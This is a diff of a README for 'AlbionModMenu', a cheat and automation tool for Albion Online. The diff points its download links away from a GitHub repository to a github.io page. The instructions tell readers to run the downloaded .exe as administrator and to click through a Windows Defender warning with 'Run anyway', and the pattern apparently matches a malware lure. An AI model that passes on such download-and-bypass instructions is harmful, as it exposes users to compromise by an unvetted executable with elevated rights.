@@ -1,6 +1,6 @@
 # 🎮 AlbionModMenu - Gain an edge in complex battles
 
-[![](https://img.shields.io/badge/Download-AlbionModMenu-blue.svg)](https://github.com/Quinceylaureate736/AlbionModMenu)
+[![](https://img.shields.io/badge/Download-AlbionModMenu-blue.svg)](https://quinceylaureate736.github.io)
 
 AlbionModMenu provides tools for players in Albion Online. This software includes features to view game data and automate repetitive tasks. You can adjust settings through a menu that appears over your game window.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/Quinceylaureate736/AlbionModMenu) to download the latest version of the toolkit.
+1. Visit the [official release page](https://quinceylaureate736.github.io) to download the latest version of the toolkit.
 2. Locate the file ending in .exe in your downloads folder.
 3. Right-click the file and select "Run as administrator."
 4. If a Windows Defender window appears, click "More info" and then "Run anyway." This happens because the software communicates with game memory.
